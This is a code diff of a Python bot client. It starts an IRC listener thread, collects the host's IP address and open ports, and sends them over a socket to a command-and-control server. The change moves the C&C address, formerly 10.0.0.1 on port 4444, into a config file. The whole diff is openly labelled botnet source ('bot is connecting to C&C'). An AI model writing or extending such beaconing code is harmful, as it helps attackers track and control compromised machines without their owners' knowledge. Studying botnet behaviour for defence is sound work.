@@ -3,6 +3,7 @@ import subprocess
 from irc_server import set_up_irc
 from threading import Thread
 import time
+import config
 
 def get_my_ip():
     cmd = ['hostname', '-I']
@@ -34,15 +35,15 @@ def send_info_to_server(client_socket, my_ip, my_open_ports):
     return 1
 
 def client_program():
-    # create a thread
+    # create a thread to listen on ports
     thread = Thread(target=set_up_irc)
     # run the thread
     thread.start()
 
     # time.sleep(5)
     # server info
-    host = "10.0.0.1"
-    port = 4444
+    cc = config.server_info["ip"]
+    port = config.server_info["port"]
 
     # get my info
     my_ip = get_my_ip()
@@ -51,7 +52,7 @@ def client_program():
     print("bot is connecting to C&C for sending info")
     # connect to server
     client_socket = socket.socket()
-    client_socket.connect((host, port))
+    client_socket.connect((cc, port))
 
     # send my info to server
     send_info_to_server(client_socket, my_ip, my_open_ports)
